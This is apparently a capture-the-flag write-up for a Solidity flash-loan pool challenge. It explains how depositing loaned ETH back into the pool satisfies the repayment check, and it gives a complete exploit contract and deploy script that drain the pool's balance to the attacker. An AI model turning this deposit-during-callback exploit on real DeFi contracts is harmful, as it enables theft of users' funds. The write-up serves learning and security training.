> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

> It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

> Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

## Moving money around

Upon contract a loan, the pool performs a callback:

```solidity
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
```

And checks whether the pool ETH balance decreased afterwards:

```solidity
if (address(this).balance < balanceBefore)
    revert RepayFailed();
```

Interestingly, the ETH sent via `deposit` is on the balance of the pool even though it can be reclaimed at any time.

IE, if the ETH from a loan is deposited right away the balance of the pool is unchanged!
That's exactly what the exploit contract does:

```solidity
function execute() external payable {
    SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
}
```

Of course the contract needs to handle payments and pipe the pool balance to the attacker:

```solidity
receive() external payable {}

function pipe(address pool) external {
    SideEntranceLenderPool(pool).flashLoan(pool.balance);
    SideEntranceLenderPool(pool).withdraw();
    payable(msg.sender).call{value: address(this).balance}("");
}
```

Ignore the warnings and run it with:

```js
const _flush = await (await ethers.getContractFactory('Flush', player)).deploy();
await _flush.pipe(pool.address);
```
